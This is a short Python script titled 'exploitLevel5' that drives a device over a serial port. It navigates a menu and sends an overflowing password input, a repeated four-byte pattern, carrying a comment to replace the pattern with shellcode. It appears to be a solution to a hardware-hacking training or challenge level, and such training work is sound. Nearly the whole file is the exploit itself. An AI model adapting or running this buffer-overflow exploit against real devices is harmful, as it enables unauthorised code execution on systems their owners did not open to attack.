# Name:        exploitLevel5
# Author:      @PagetPhil

import serial
import time

# configure the serial connections (the parameters differs on the device you are connecting to)
ser = serial.Serial(port='COM17', baudrate=9600)

ser.close()
#ser.isOpen()
ser.open()

strg = ""
while strg != b"\r\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(20))         # skip "Press ENTER to start"
ser.write(b"\x0D");

strg = ""
while strg != b"\r\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(8))         # skip "Choice: "
ser.write(b"1");

strg = ""
while strg != b"1\x0C\r\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(20))         # skip "Enter the password: "
ser.write(b"\xE5\x20\x00\x08"*17+b"\x0D");
# replace pattern with shellcode

strg = ""
while strg != b"AZAZAZA\n" :
	strg = ser.readline()
	print(strg)

